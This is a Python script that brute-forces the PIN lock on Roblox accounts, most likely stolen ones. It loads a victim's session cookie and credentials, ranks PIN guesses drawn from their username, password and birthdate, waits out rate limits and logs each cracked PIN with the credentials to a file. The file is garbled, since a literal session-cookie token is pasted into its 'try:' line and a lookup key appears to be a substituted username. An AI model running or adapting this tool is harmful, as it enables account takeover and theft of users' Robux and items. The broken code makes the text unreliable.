import os, time, requests
from threading import Thread
from datetime import datetime

credentials = input('Enter the account user:pass:cookie or cookie ~ ')
if credentials.count(':') >= 2:
    username, password, cookie = credentials.split(':',2)
else:
    username, password, cookie = '', '', credentials
os.system('cls')

req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_56544BF89BAFD74123A94CB859BEE3BC98B7789E63C83943EC8D4644DC52031D3CB0A1205ED72137C555B9A5AF460BC628451F53F5D9B6E66C1388016C8F4F7FD37D0C2A0FBE677CC4A4DF013F660D101D158E32D6CB843BBBB9FBA9BCD062594CA7E72C5CDBA3E086C5F43EA02F71D8A1947825F0A8F05A70BFA634BFB70B4EACA056B1CE477FFD8D44DE78052E1B85281D7DAD9B3F48D5A1DC9FD69DCFB1BD127D80D9B3D37FA808B91CB6A69AA946E1C1919D06D3D317F2C64F4DCC1468BD7023B9279B2C2D088DA3E817CFD276F7174DDA72B2397E1384CED7B5ED48C5C1B69F94CE2A4D7EEDC0151379AA3B0A12C4B5FDB61F32B40DC744FCC237244315A24F9541BC00C0A0C6B4D47D96008A046F51F5B22E578739202AF761D7F9910E567119A2E02374A5699EAF3229DB606120764022AADA5B29E3F72262A5BC3A66F21659CA1B1BC43106490E0A665033D665EDA1C0
    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['DoKenShinD']
    print('Logged in to', username)
except:
    input('INVALID COOKIE')
    exit()

common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
print('Loaded pins by commonality.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)
print(f'Prioritized likely pins {likely}\n')

tried = 0
while 1:
    pin = pins.pop(0)
    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired.')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('pins.txt','a') as f:
                    f.write(f'NO PIN:{credentials}\n')
                break
            elif code == 3 or '"message":"TooManyRequests"' in r.text:
                pins.insert(0, pin)
                print(f'[{datetime.now()}] Sleeping for 5 minutes.')
                time.sleep(60*5)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('pins.txt','a') as f:
                f.write(f'{pin}:{credentials}\n')
            break
        else:
            pins.insert(0, pin)
            print(f'[ERROR] {r.text}')
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.insert(0, pin)

input()
